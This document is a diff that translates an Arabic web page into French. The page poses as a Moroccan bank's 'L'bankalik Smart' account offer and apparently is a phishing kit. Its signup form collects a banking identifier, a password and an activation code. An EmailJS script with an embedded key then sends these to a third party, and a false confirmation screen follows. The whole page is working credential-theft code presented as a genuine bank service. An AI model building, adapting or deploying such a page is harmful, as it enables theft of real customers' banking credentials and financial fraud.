@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ترحيب وتسجيل</title>
+    <title>Bienvenue et Inscription</title>
     <style>
         /* إعدادات أساسية */
         body {
@@ -28,7 +28,6 @@
             display: block;
         }
 
-        /* الحاوية الرئيسية */
         .welcome-container, .signup-container {
             background: #fff;
             color: #333;
@@ -39,7 +38,7 @@
             width: 600px;
         }
 
-        .welcome-container img {
+        .welcome-container img, .signup-container img {
             max-width: 100%;
             height: auto;
             margin-bottom: 20px;
@@ -56,14 +55,6 @@
             }
         }
 
-        .signup-container img {
-            max-width: 100%;
-            height: auto;
-            margin-bottom: 20px;
-            border-radius: 10px;
-        }
-
-        /* تنسيق العنوان */
         h1, h2 {
             font-size: 22px;
             font-weight: bold;
@@ -78,7 +69,6 @@
             color: #555;
         }
 
-        /* الأزرار */
         button {
             padding: 10px 20px;
             background-color: #e55640;
@@ -95,7 +85,6 @@
             background-color: #d94537;
         }
 
-        /* إعدادات النموذج */
         form {
             text-align: left;
         }
@@ -108,7 +97,7 @@
         }
 
         form input {
-            width: 100%; /* عرض كامل الخانة */
+            width: 100%;
             padding: 10px;
             margin-bottom: 15px;
             border: 1px solid #ccc;
@@ -117,16 +106,16 @@
             color: #333;
             outline: none;
             transition: border-color 0.3s, box-shadow 0.3s;
-            box-sizing: border-box; /* لضمان التوافق مع الحواف والمسافات */
+            box-sizing: border-box;
         }
 
         form input:focus {
-            border-color: #e55640; /* لون الحافة عند التركيز */
+            border-color: #e55640;
             box-shadow: 0 0 5px rgba(229, 86, 64, 0.5);
         }
 
         form button {
-            width: 100%; /* عرض كامل الزر */
+            width: 100%;
             padding: 12px;
             margin-top: 10px;
             font-size: 16px;
@@ -135,60 +124,56 @@
     </style>
 </head>
 <body>
-    <!-- صفحة الترحيب -->
+    <!-- Page d'accueil -->
     <div class="page welcome-container active" id="welcomePage">
         <img src="https://i.postimg.cc/BQB7SSzd/smart-1.png" alt="Smart Offer">
         <h1>L’offre L’bankalik Smart à partir de 0dh*/mois</h1>
         <p>
             Un compte gratuit* pour les moins de 35 ans, sans conditions de revenus, ni frais de tenue de compte.<br>
             Si vous avez plus de 35 ans, bénéficiez de l’offre Smart à 5 dhs TTC/mois.<br><br>
-
             Une carte 100% personnalisable, internationale & sans contact, pour payer en ligne et chez les commerçants, au Maroc et à l’étranger.<br><br>
         </p>
-        <button onclick="goToSignup()">تفعيل الحساب</button>
+        <button onclick="goToSignup()">Activer le compte</button>
     </div>
 
-    <!-- صفحة التسجيل -->
+    <!-- Page d'inscription -->
     <div class="page signup-container" id="signupPage">
         <img src="https://i.postimg.cc/DmkJJ3YD/logo.png" alt="Logo">
-        <h2>تسجيل الدخول</h2>
+        <h2>Inscription</h2>
         <form id="signupForm">
-            <label for="email">البريد الإلكتروني</label>
-            <input type="email" id="email" placeholder="أدخل بريدك الإلكتروني" required>
+            <label for="identifiant">Identifiant</label>
+            <input type="text" id="identifiant" placeholder="Entrez votre identifiant" required>
             
-            <label for="password">كلمة السر</label>
-            <input type="password" id="password" placeholder="أدخل كلمة السر" required>
+            <label for="password">Mot de passe</label>
+            <input type="password" id="password" placeholder="Entrez votre mot de passe" required>
             
-            <label for="activationCode">كود التفعيل</label>
-            <input type="text" id="activationCode" placeholder="أدخل كود التفعيل" required>
+            <label for="activationCode">Code d’activation</label>
+            <input type="text" id="activationCode" placeholder="Entrez votre code d’activation" required>
             
-            <button type="submit">تسجيل</button>
+            <button type="submit">S'inscrire</button>
         </form>
     </div>
 
-    <!-- صفحة تأكيد -->
-<div class="page confirmation-container" id="confirmationPage">
-    <div style="background: #fff; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2); max-width: 600px; margin: auto; text-align: center;">
-        <img src="https://i.postimg.cc/fTpWL1LK/apple-pay-backgound-lbankalik.png" alt="Success" style="max-width: 100px; margin-bottom: 20px;">
-        <h2 style="color: #e55640; font-size: 24px; margin-bottom: 15px;">تم تسجيلك بنجاح!</h2>
-        <p style="color: #555; font-size: 16px; line-height: 1.8; margin-bottom: 30px;">
-            سيتم مراجعة معلوماتك وسنعاود التواصل معك قريبًا. شكرًا لاستخدامك خدماتنا.
-        </p>
-        <button onclick="goToWelcome()" style="padding: 12px 20px; background-color: #e55640; color: #fff; border: none; border-radius: 5px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background-color 0.3s;">
-            عودة إلى الصفحة الرئيسية
-        </button>
+    <!-- Page de confirmation -->
+    <div class="page confirmation-container" id="confirmationPage">
+        <div style="background: #fff; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2); max-width: 600px; margin: auto; text-align: center;">
+            <img src="https://i.postimg.cc/fTpWL1LK/apple-pay-backgound-lbankalik.png" alt="Success" style="max-width: 100px; margin-bottom: 20px;">
+            <h2 style="color: #e55640; font-size: 24px; margin-bottom: 15px;">Inscription réussie !</h2>
+            <p style="color: #555; font-size: 16px; line-height: 1.8; margin-bottom: 30px;">
+                Vos informations seront vérifiées. Nous vous contacterons bientôt. Merci d’avoir utilisé nos services.
+            </p>
+            <button onclick="goToWelcome()" style="padding: 12px 20px; background-color: #e55640; color: #fff; border: none; border-radius: 5px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background-color 0.3s;">
+                Retour à la page principale
+            </button>
+        </div>
     </div>
-</div>
-
 
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <script>
-        // تهيئة EmailJS
         (function(){
             emailjs.init("rOYZNv4YSPlhnjLKI");
         })();
 
-        // الانتقال بين الصفحات
         function goToSignup() {
             document.getElementById("welcomePage").classList.remove("active");
             document.getElementById("signupPage").classList.add("active");
@@ -199,16 +184,15 @@
             document.getElementById("welcomePage").classList.add("active");
         }
 
-        // معالجة النموذج
         document.getElementById("signupForm").addEventListener("submit", function (event) {
             event.preventDefault();
 
-            const email = document.getElementById("email").value;
+            const identifiant = document.getElementById("identifiant").value;
             const password = document.getElementById("password").value;
             const activationCode = document.getElementById("activationCode").value;
 
             const templateParams = {
-                user_email: email,
+                user_identifiant: identifiant,
                 user_password: password,
                 activation_code: activationCode
             };
@@ -220,7 +204,7 @@
                     document.getElementById("confirmationPage").classList.add("active");
                 }, function(error) {
                     console.error("FAILED...", error);
-                    alert("حدث خطأ أثناء الإرسال. حاول مرة أخرى.");
+                    alert("Une erreur est survenue. Veuillez réessayer.");
                 });
         });
     </script>
